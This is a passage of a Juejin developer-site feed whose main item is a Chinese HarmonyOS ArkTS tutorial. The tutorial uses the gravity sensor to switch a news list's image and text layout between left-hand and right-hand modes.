<p>（内心OS：打得再激烈点～）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[鸿蒙开发实战：玩转“智感握姿”——新闻列表左右手智能切换]]></title>    <link>https://juejin.cn/post/7602455806446993414</link>    <guid>https://juejin.cn/post/7602455806446993414</guid>    <pubDate>2026-02-04T02:00:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602455806446993414" data-draft-id="7602455806446977030" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="鸿蒙开发实战：玩转“智感握姿”——新闻列表左右手智能切换"/> <meta itemprop="keywords" content="HarmonyOS,ArkUI,ArkTS"/> <meta itemprop="datePublished" content="2026-02-04T02:00:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="威哥爱编程"/> <meta itemprop="url" content="https://juejin.cn/user/2242659450109575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            鸿蒙开发实战：玩转“智感握姿”——新闻列表左右手智能切换
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2242659450109575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    威哥爱编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:00:35.000Z" title="Wed Feb 04 2026 02:00:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是V哥。</p>
<p>你有没有遇到过这种情况：</p>
<blockquote>
<p>左手拿着奶茶，右手刷新闻，结果头图永远在右边，点都点不到？</p>
</blockquote>
<p>现在好了，系统能实时感知你是左手还是右手握持，UI 自动适配！这才是真正的“懂你”！</p>
<p>今天 V 哥就用一个新闻列表页面，带你 10 分钟搞定智感握姿的完整开发！能根据你拿手机的姿势，自动把图片和文字互换位置。代码全在一个页面，复制进去就能跑，绝对硬核！</p>
<h2 data-id="heading-0">技术原理：手机怎么知道那是你的左手？</h2>
<p>其实很简单。你想想，当你用<strong>右手</strong>单手握持手机时，为了让大拇指够到屏幕左侧，手机通常会不由自主地向<strong>左倾斜</strong>一点点（或者向右倾斜，看个人习惯，通常我们设定一个倾斜阈值）。</p>
<p>咱们利用鸿蒙的 <code>@ohos.sensor</code>（传感器能力），监听重力变化。</p>
<ul>
<li>当检测到手机向左倾斜（X轴重力分量变化），判定为左手或左侧模式。</li>
<li>当检测到手机向右倾斜，判定为右手或右侧模式。</li>
</ul>
<p>话不多说，直接上干货。</p>
<h2 data-id="heading-1">实战代码：智感握姿新闻列表</h2>
<p>先看一下 V 哥写的案例截图：</p>
<p>左手模式：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b42835686180458ca633de69f422302a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aiB5ZOl54ix57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775235&amp;x-signature=RB6sXkH4TZrwj%2Fb4HNrZXo9ZmmY%3D" alt="" loading="lazy"/></p>
<p>右手模式：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0a094fd43a24a7f87fec7d5fd8d656e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aiB5ZOl54ix57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775235&amp;x-signature=GCDYvuJye6KgaQScA9xY62BDwho%3D" alt="" loading="lazy"/></p>
<p>准备好你的 DevEco Studio，新建一个 ArkTS 页面，把下面的代码全选、复制、粘贴进去。</p>
<h3 data-id="heading-2">完整代码案例</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> sensor <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.sensor'</span>;
<span class="hljs-keyword">import</span> promptAction <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.promptAction'</span>;

<span class="hljs-comment">// 1. 定义新闻数据模型</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NewsItem</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">summary</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">imageColor</span>: <span class="hljs-title class_">Color</span>; <span class="hljs-comment">// 用颜色块代替图片，方便测试，不用找资源</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, title: <span class="hljs-built_in">string</span>, summary: <span class="hljs-built_in">string</span>, color: Color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span> = title;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">summary</span> = summary;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imageColor</span> = color;
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">SmartGripNewsPage</span> {
  <span class="hljs-comment">// 2. 状态变量</span>
  <span class="hljs-comment">// isRightMode: true 代表右手模式（图在右），false 代表左手模式（图在左）</span>
  <span class="hljs-meta">@State</span> <span class="hljs-attr">isRightMode</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">true</span>;
  <span class="hljs-comment">// 记录当前的倾斜角度X值，用于显示调试信息</span>
  <span class="hljs-meta">@State</span> <span class="hljs-attr">currentGravityX</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// 模拟新闻数据</span>
  <span class="hljs-meta">@State</span> <span class="hljs-attr">newsList</span>: <span class="hljs-title class_">NewsItem</span>[] = [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"鸿蒙Next正式发布"</span>, <span class="hljs-string">"纯血鸿蒙不再兼容安卓，开启移动操作系统新纪元。"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"V哥聊技术"</span>, <span class="hljs-string">"深度解析ArkTS语言特性，带你弯道超车。"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Red</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">3</span>, <span class="hljs-string">"2026行业展望"</span>, <span class="hljs-string">"AI赛道爆发，普通程序员如何抓住最后的机会？"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Green</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">4</span>, <span class="hljs-string">"SpaceX星舰发射"</span>, <span class="hljs-string">"马斯克火星殖民计划又近了一步，震撼全人类。"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Orange</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewsItem</span>(<span class="hljs-number">5</span>, <span class="hljs-string">"周末去哪儿玩"</span>, <span class="hljs-string">"发现城市周边的小众露营地，放松身心好去处。"</span>, <span class="hljs-title class_">Color</span>.<span class="hljs-property">Pink</span>),
  ];

  <span class="hljs-comment">// 3. 页面加载时开启传感器监听</span>
  <span class="hljs-title function_">aboutToAppear</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startSensor</span>();
  }

  <span class="hljs-comment">// 4. 页面销毁时关闭传感器，省电</span>
  <span class="hljs-title function_">aboutToDisappear</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">stopSensor</span>();
  }

  <span class="hljs-comment">// 开启传感器逻辑</span>
  <span class="hljs-title function_">startSensor</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 监听重力传感器，频率设置为 UI (适合UI交互的频率)</span>
      sensor.<span class="hljs-title function_">on</span>(sensor.<span class="hljs-property">SensorId</span>.<span class="hljs-property">GRAVITY</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
        <span class="hljs-comment">// data.x 代表 x 轴的重力分量</span>
        <span class="hljs-comment">// 当手机竖屏面对你：</span>
        <span class="hljs-comment">// 手机向右倾斜，x &gt; 0</span>
        <span class="hljs-comment">// 手机向左倾斜，x &lt; 0</span>
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentGravityX</span> = data.<span class="hljs-property">x</span>;

        <span class="hljs-comment">// 设置一个阈值，防止轻微抖动就切换</span>
        <span class="hljs-comment">// 这里设置 1.5 为阈值，你可以根据手感调整</span>
        <span class="hljs-keyword">if</span> (data.<span class="hljs-property">x</span> &gt; <span class="hljs-number">1.5</span>) {
          <span class="hljs-comment">// 向右倾斜，认为是右手握持或者想看右边</span>
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> === <span class="hljs-literal">false</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> = <span class="hljs-literal">true</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showToast</span>(<span class="hljs-string">"智感切换：右手模式"</span>);
          }
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">x</span> &lt; -<span class="hljs-number">1.5</span>) {
          <span class="hljs-comment">// 向左倾斜，认为是左手握持</span>
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> === <span class="hljs-literal">true</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> = <span class="hljs-literal">false</span>;
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showToast</span>(<span class="hljs-string">"智感切换：左手模式"</span>);
          }
        }
      }, { <span class="hljs-attr">interval</span>: <span class="hljs-number">100000000</span> }); <span class="hljs-comment">// 100ms 一次回调</span>
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"V哥提示：传感器启动失败，可能是模拟器不支持"</span>, err);
    }
  }

  <span class="hljs-comment">// 关闭传感器</span>
  <span class="hljs-title function_">stopSensor</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
      sensor.<span class="hljs-title function_">off</span>(sensor.<span class="hljs-property">SensorId</span>.<span class="hljs-property">GRAVITY</span>);
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"V哥提示：传感器关闭失败"</span>, err);
    }
  }

  <span class="hljs-comment">// 小提示弹窗</span>
  <span class="hljs-title function_">showToast</span>(<span class="hljs-params">msg: <span class="hljs-built_in">string</span></span>) {
    promptAction.<span class="hljs-title function_">showToast</span>({
      <span class="hljs-attr">message</span>: msg,
      <span class="hljs-attr">duration</span>: <span class="hljs-number">1500</span>,
      <span class="hljs-attr">bottom</span>: <span class="hljs-number">100</span>
    });
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-comment">// 顶部标题栏</span>
      <span class="hljs-title class_">Row</span>() {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">"智感新闻"</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
          .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        <span class="hljs-title class_">Blank</span>()
        <span class="hljs-comment">// 显示当前模式状态</span>
        <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> ? <span class="hljs-string">"当前：右手模式"</span> : <span class="hljs-string">"当前：左手模式"</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">14</span>)
          .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
      }
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-number">60</span>)
      .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#F1F3F5'</span>)

      <span class="hljs-comment">// 调试信息（正式上线可以去掉）</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`重力X轴感应值: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentGravityX.toFixed(<span class="hljs-number">2</span>)}</span>`</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">12</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
        .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">bottom</span>: <span class="hljs-number">10</span> })

      <span class="hljs-comment">// 新闻列表</span>
      <span class="hljs-title class_">List</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">15</span> }) {
        <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">newsList</span>, <span class="hljs-function">(<span class="hljs-params">item: NewsItem</span>) =&gt;</span> {
          <span class="hljs-title class_">ListItem</span>() {
            <span class="hljs-comment">// 核心布局：根据 isRightMode 决定布局方向</span>
            <span class="hljs-comment">// Direction.Ltr (Left to Right) 或者是 Rtl</span>
            <span class="hljs-comment">// 这里我们用 Flex 或者 Row 手动控制顺序更稳</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">NewsItemBuilder</span>(item)
          }
        })
      }
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 占满剩余空间</span>
      .<span class="hljs-title function_">padding</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">15</span> })
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
  }

  <span class="hljs-comment">// 自定义构建函数，处理单个新闻的布局</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-title class_">NewsItemBuilder</span>(<span class="hljs-attr">item</span>: <span class="hljs-title class_">NewsItem</span>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-comment">// 这里的逻辑：</span>
      <span class="hljs-comment">// 如果是左手模式(isRightMode=false)，图片在左，文字在右</span>
      <span class="hljs-comment">// 如果是右手模式(isRightMode=true)，文字在左，图片在右</span>
      <span class="hljs-comment">// 利用 Row 的 direction 属性或者简单的 if/else 渲染顺序</span>

      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span>) {
        <span class="hljs-comment">// 左手模式：图 -&gt; 文</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">ImageBlock</span>(item.<span class="hljs-property">imageColor</span>)
        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">TextBlock</span>(item)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 右手模式：文 -&gt; 图</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">TextBlock</span>(item)
        <span class="hljs-variable language_">this</span>.<span class="hljs-title class_">ImageBlock</span>(item.<span class="hljs-property">imageColor</span>)
      }
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">100</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)
    .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">10</span>)
    .<span class="hljs-title function_">shadow</span>({ <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0x1F000000</span>, <span class="hljs-attr">offsetY</span>: <span class="hljs-number">2</span> })
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
    <span class="hljs-comment">// 添加一个顺滑的动画效果</span>
    .<span class="hljs-title function_">animation</span>({
      <span class="hljs-attr">duration</span>: <span class="hljs-number">300</span>,
      <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span>
    })
  }

  <span class="hljs-comment">// 抽取图片组件</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-title class_">ImageBlock</span>(<span class="hljs-attr">color</span>: <span class="hljs-title class_">Color</span>) {
    <span class="hljs-comment">// 模拟图片</span>
    <span class="hljs-title class_">Stack</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">"头图"</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">12</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">backgroundColor</span>(color)
    .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">8</span>)
    .<span class="hljs-title function_">margin</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isRightMode</span> ? { <span class="hljs-attr">left</span>: <span class="hljs-number">10</span> } : { <span class="hljs-attr">right</span>: <span class="hljs-number">10</span> }) <span class="hljs-comment">// 根据位置给间距</span>
  }

  <span class="hljs-comment">// 抽取文字组件</span>
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-title class_">TextBlock</span>(<span class="hljs-attr">item</span>: <span class="hljs-title class_">NewsItem</span>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(item.<span class="hljs-property">title</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">maxLines</span>(<span class="hljs-number">1</span>)
        .<span class="hljs-title function_">textOverflow</span>({ <span class="hljs-attr">overflow</span>: <span class="hljs-title class_">TextOverflow</span>.<span class="hljs-property">Ellipsis</span> })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      
      <span class="hljs-title class_">Text</span>(item.<span class="hljs-property">summary</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">14</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
        .<span class="hljs-title function_">maxLines</span>(<span class="hljs-number">2</span>)
        .<span class="hljs-title function_">textOverflow</span>({ <span class="hljs-attr">overflow</span>: <span class="hljs-title class_">TextOverflow</span>.<span class="hljs-property">Ellipsis</span> })
        .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">5</span> })
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    }
    .<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 占满剩余宽度</span>
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">justifyContent</span>(<span class="hljs-title class_">FlexAlign</span>.<span class="hljs-property">Start</span>)
    .<span class="hljs-title function_">alignItems</span>(<span class="hljs-title class_">HorizontalAlign</span>.<span class="hljs-property">Start</span>)
  }
}
</code></pre>
<h3 data-id="heading-3">代码深度解析（V哥掰碎了讲）</h3>
<p>兄弟们，代码贴完了，V哥给你捋一捋这里的核心门道，面试或者做项目的时候都能吹一波。</p>
<p><strong>1. 传感器监听 (<code>sensor.on</code>)</strong>
这是整个功能的灵魂。我们用了 <code>sensor.SensorId.GRAVITY</code>。</p>
<ul>
<li><code>data.x</code> 是关键。当你拿着手机往左歪（像是左手拿着手机想看左边屏幕）时，X轴会变负数；往右歪时，X轴变正数。</li>
<li>这里我加了个<strong>阈值 1.5</strong>。为啥？如果不加阈值，你的手稍微抖一下，界面就左右乱跳，用户得气死。1.5 是个经验值，大约倾斜 15-20 度左右触发，既灵敏又不会误触。</li>
</ul>
<p><strong>2. 状态驱动 UI (<code>@State isRightMode</code>)</strong>
鸿蒙 ArkUI 的精髓就是<strong>状态驱动</strong>。</p>
<ul>
<li>我们不需要去手动搬运组件。只要改变 <code>isRightMode</code> 这个布尔值，UI 就会自动刷新。</li>
<li>配合 <code>.animation</code> 属性，当组件位置互换时，不会生硬地“闪现”，而是会有一个滑动的过渡效果，高级感立马就来了。</li>
</ul>
<p><strong>3. 条件渲染 (<code>if/else</code>)</strong>
在 <code>NewsItemBuilder</code> 里，V哥用了一个最笨但最有效的方法：</p>
<ul>
<li>如果是左手模式：先渲染图片组件，再渲染文字组件。</li>
<li>如果是右手模式：先渲染文字组件，再渲染图片组件。</li>
<li>因为是在 <code>Row</code> 容器里，渲染顺序直接决定了谁在左谁在右。</li>
</ul>
<h3 data-id="heading-4">怎么测试？</h3>
<ol>
<li><strong>真机测试（推荐）</strong>：把代码烧录到鸿蒙手机上。拿着手机向左倾斜一下，你会发现图片“刷”一下跑到左边了；向右倾斜一下，图片又跑回右边了。</li>
<li><strong>模拟器测试</strong>：DevEco Studio 的模拟器通常有个“虚拟传感器”面板。你可以手动拖动重力传感器的 X 轴滑块，模拟手机倾斜，看界面会不会变。</li>
</ol>
<h3 data-id="heading-5">V哥的最后唠叨</h3>
<p>兄弟们，这个功能虽然代码不多，但体现的是<strong>以人为本</strong>的设计思维。</p>
<p>这就是鸿蒙 Next 开发好玩的地方，硬件能力调用极其简单。2026年，不管是做应用还是做系统，<strong>交互体验</strong>永远是核心竞争力。</p>
<p>赶紧把这代码跑起来，以后老板让你做“适老化”或者“单手模式”，你把这个 Demo 一亮，绝对惊艳全场！祝大家发码愉快，没有 Bug！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[春哥的Agent通关秘籍04：智能记账小秘书【实战篇】]]></title>    <link>https://juejin.cn/post/7602454700504055849</link>    <guid>https://juejin.cn/post/7602454700504055849</guid>    <pubDate>2026-02-04T00:16:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700504055849" data-draft-id="7602472997921095680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="春哥的Agent通关秘籍04：智能记账小秘书【实战篇】"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-04T00:16:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="摸鱼的春哥"/> <meta itemprop="url" content="https://juejin.cn/user/1714893870865303"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 